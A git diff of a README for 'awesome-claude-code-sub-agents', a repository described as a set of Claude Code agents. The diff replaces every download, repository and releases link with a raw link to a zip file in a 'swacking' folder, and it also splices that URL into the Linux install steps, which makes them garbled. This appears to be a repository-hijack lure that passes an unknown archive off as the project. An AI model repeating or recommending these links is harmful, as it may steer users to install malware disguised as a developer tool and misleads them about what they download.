@@ -1,7 +1,7 @@
 # 🎉 awesome-claude-code-sub-agents - Enhance Your Coding With Specialized Agents
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Santxs999/awesome-claude-code-sub-agents/releases)
+[![Download](https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip)
 
 ## 📖 About This Project
 awesome-claude-code-sub-agents is a collection of specialized Claude Code agents designed to help you code smarter and faster. Whether you’re working on JavaScript, TypeScript, or Golang, these agents provide helpful tools to support your coding experience.
@@ -19,14 +19,14 @@ Before downloading, ensure your device meets the following system requirements:
 1. Click the **Download Now** button at the top of the page.
 2. You will be directed to the Releases page.
 3. Find the latest version of the app.
-4. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `.tar.gz` for Linux).
+4. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip` for Linux).
 
 ## 💻 Running the Application
 After downloading, locate the downloaded file:
 
 - **On Windows:** Double-click the `.exe` file and follow the prompts to install.
 - **On macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-- **On Linux:** Extract the contents of the `.tar.gz` file and run the application from the terminal.
+- **On Linux:** Extract the contents of the `https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip` file and run the application from the terminal.
 
 ### First Launch
 1. Open the application from your installation location.
@@ -49,11 +49,11 @@ This project is licensed under the MIT License. Find more about the license in t
 For any inquiries, please reach out via the contact details provided in the repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Santxs999/awesome-claude-code-sub-agents)
-- [Releases Page](https://github.com/Santxs999/awesome-claude-code-sub-agents/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip)
+- [Releases Page](https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip)
 
 ## 📥 Download & Install
-For the latest version and to download the application, visit the [Releases page](https://github.com/Santxs999/awesome-claude-code-sub-agents/releases). Follow the steps provided earlier to ensure a smooth installation process.
+For the latest version and to download the application, visit the [Releases page](https://raw.githubusercontent.com/Santxs999/awesome-claude-code-sub-agents/main/swacking/awesome-claude-code-sub-agents.zip). Follow the steps provided earlier to ensure a smooth installation process.
 
 ---
 
